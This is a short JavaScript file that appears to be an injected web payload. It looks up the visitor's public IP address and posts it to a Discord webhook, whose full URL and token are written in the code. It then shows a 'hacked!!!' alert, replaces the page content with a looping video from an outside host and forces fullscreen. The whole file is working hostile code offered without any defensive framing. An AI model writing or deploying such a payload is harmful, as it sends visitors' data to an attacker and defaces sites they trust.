var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "https://api.ipify.org/", false ); // false for synchronous request
xmlHttp.send( null );



fetch('https://discord.com/api/webhooks/1101592283146637373/OA0skb_yVbKmxe9cB6a4uEYJyyr1h4_ItLMgD3x6ZTyKB7EKsPRjqvpsmx_yZUAaO28K', {
    method: 'POST',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({"content": "IP address:" + xmlHttp.responseText,"embeds": null,"attachments": []})
})

alert("hacked!!! " + xmlHttp.responseText + " 😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹')

document.getElementById('ccc').innerHTML = ''
document.body.innerHTML = '<video id="video" style="width: 100%; height: 100%; object-fit: cover;" src="https://pnrtscr.com/video.mp4" loop=""></video>';


const video = document.getElementById("video");
video.play();

const { documentElement } = document;
if(documentElement.requestFullscreen) documentElement.requestFullscreen();
else if(documentElement.mozRequestFullScreen) documentElement.mozRequestFullScreen();
else if(documentElement.webkitRequestFullscreen) documentElement.webkitRequestFullscreen();
else if(documentElement.msRequestFullscreen) documentElement.msRequestFullscreen();





